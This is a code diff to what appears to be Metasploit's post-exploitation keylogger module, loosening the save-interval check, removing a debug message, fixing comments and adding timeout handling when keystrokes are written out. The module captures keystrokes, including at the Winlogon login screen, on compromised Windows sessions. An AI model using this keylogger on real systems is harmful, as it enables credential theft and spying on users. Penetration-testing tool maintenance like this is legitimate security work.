@@ -35,7 +35,7 @@ class MetasploitModule < Msf::Post
       [
         OptBool.new('LOCKSCREEN',   [false, 'Lock system screen.', false]),
         OptBool.new('MIGRATE',      [false, 'Perform Migration.', false]),
-        OptInt.new( 'INTERVAL',     [false, 'Time interval to save keystrokes in seconds (5 to 30)', 5]),
+        OptInt.new( 'INTERVAL',     [false, 'Time interval to save keystrokes in seconds', 5]),
         OptInt.new( 'PID',          [false, 'Process ID to migrate to', nil]),
         OptEnum.new('CAPTURE_TYPE', [false, 'Capture keystrokes for Explorer, Winlogon or PID',
                 'explorer', ['explorer','winlogon','pid']])
@@ -76,7 +76,7 @@ class MetasploitModule < Msf::Post
     @timed_out = false
 
     @interval = datastore['INTERVAL'].to_i
-    if @interval < 5 || @interval > 30
+    if @interval < 1
       print_error("INTERVAL value out of bounds. Setting to 5.")
       @interval = 5
     end
@@ -236,7 +236,6 @@ class MetasploitModule < Msf::Post
 
   # This function manages the key recording process
   # It stops the process if the session is killed or goes stale
-  # It will skip an interval if the session becomes inactive.
   #
   # @return [void] A useful return value is not expected here
   def keycap
@@ -250,7 +249,6 @@ class MetasploitModule < Msf::Post
       begin
         if session_good?
           sleep(@interval)
-          print_status("Cap")
           write_keylog_data
         else
           print_status("Session: #{datastore['SESSION']} is stale or has been closed. Exiting keylog recorder.")
@@ -265,14 +263,14 @@ class MetasploitModule < Msf::Post
           rec = 0
           return
         else
-          print_status("Keylog recorder encounted Error: #{e.class} #{e} Exiting...")
+          print_error("Keylog recorder encounted Error: #{e.class} #{e} Exiting...")
         end
         rec = 0
       end
     end
   end
 
-  # This function manages sure a session is still alive acording to the Framework.
+  # This function makes sure a session is still alive acording to the Framework.
   # Also, if the session reaches the timeout age whithout checking in it is
   # assumed to be stale.
   #
@@ -293,7 +291,16 @@ class MetasploitModule < Msf::Post
   def finish_up
     print_status("Shutting down the keylog recorder. Stand by.")
     sleep(@interval)
-    write_keylog_data
+    begin
+      write_keylog_data
+    rescue::Exception => e
+      if e.class.to_s == "Rex::TimeoutError"
+        print_status("Session: #{datastore['SESSION']} is not responding. Exiting keylog recorder.")
+      else
+        print_error("Keylog recorder encounted Error: #{e.class} #{e} Exiting...")
+      end
+      return
+    end
     session.ui.keyscan_stop rescue nil
   end
 
